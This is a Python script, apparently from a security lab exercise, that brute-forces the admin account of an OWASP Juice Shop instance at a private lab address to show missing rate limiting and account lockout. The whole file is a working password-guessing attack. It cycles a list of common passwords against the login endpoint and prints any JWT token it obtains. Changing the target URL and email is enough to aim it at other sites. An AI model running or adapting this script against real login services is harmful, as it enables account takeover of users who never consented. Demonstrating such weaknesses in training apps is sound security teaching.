#!/usr/bin/env python3
# Brute-force атака на логин Juice Shop (A04 Insecure Design)

import requests
import time
import sys

TARGET = "http://172.20.0.106:3000"
EMAIL = "admin@juice-sh.op"

PASSWORDS = [
    "password", "123456", "12345678", "qwerty", "abc123",
    "monkey", "1234567", "letmein", "trustno1", "dragon",
    "baseball", "111111", "iloveyou", "master", "sunshine",
    "ashley", "bailey", "passw0rd", "shadow", "123123",
    "admin123", "admin", "password123", "welcome", "login"
]

def attempt_login(email, password):
    url = f"{TARGET}/rest/user/login"
    payload = {"email": email, "password": password}
    try:
        response = requests.post(url, json=payload, timeout=5)
        return response.status_code, response.json()
    except Exception as e:
        return None, str(e)

def main():
    print("=" * 70)
    print("Juice Shop Login Brute-Force Attack")
    print("Demonstrating Insecure Design: No Rate Limiting (A04:2021)")
    print("=" * 70)
    print(f"[*] Target: {TARGET}")
    print(f"[*] Email: {EMAIL}")
    print(f"[*] Password wordlist size: {len(PASSWORDS)}")
    print("\n[!] Attack demonstrates lack of rate limiting protection")
    print("[!] Real application should block after 3-5 failed attempts")
    print("-" * 70)

    attempt = 0
    start_time = time.time()
    failed_attempts = 0

    for password in PASSWORDS:
        attempt += 1
        print(f"[{attempt:2d}/{len(PASSWORDS)}] Password: {password:15s}...", end=" ")

        status, response = attempt_login(EMAIL, password)

        if status == 200 and "authentication" in str(response):
            print("✓ SUCCESS!")
            print("\n" + "=" * 70)
            print("[+] Login successful!")
            print(f"[+] Email: {EMAIL}")
            print(f"[+] Password: {password}")
            print(f"[+] Failed attempts before success: {failed_attempts}")
            print(f"[+] Time elapsed: {time.time() - start_time:.2f} seconds")

            token = None
            try:
                token = response.get("authentication", {}).get("token", "")
            except Exception:
                pass
            if token:
                print(f"[+] JWT Token: {token[:60]}...")

            print("\n[!] VULNERABILITY: No account lockout after multiple failures!")
            print("[!] VULNERABILITY: No CAPTCHA to prevent automation!")
            print("[!] VULNERABILITY: No rate limiting detected!")
            print("=" * 70)
            sys.exit(0)
        else:
            failed_attempts += 1
            print("✗ Failed")

        time.sleep(0.3)

    print("\n" + "=" * 70)
    print(f"[!] NO RATE LIMITING DETECTED - All {attempt} attempts accepted!")
    print("=" * 70)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n[!] Attack interrupted by user")
        sys.exit(1)
